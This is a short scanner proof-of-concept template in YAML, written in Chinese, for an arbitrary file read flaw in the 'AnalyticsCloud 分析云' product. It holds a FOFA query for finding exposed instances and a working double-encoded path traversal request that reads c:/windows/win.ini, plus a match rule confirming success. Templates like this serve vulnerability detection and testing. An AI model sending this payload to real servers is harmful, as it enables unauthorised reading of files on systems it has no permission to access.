id: poc-yaml-AnalyticsCloud-anyfile-read
info:
  name: AnalyticsCloud 分析云 任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: AnalyticsCloud 分析云
  fofa: title="AnalyticsCloud 分析云"
requests:
- method: GET
  path: /a/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/c:/windows/win.ini
  expression: "status_code == 200 && \ncontains(body,\"; for 16-bit app support\"\
    ) &&\ncontains(body,\"[files]\") &&\ncontains(content_type,\"text/plain\") &&\n\
    !contains(body,\"<\")\n"
variables: {}
transport: http
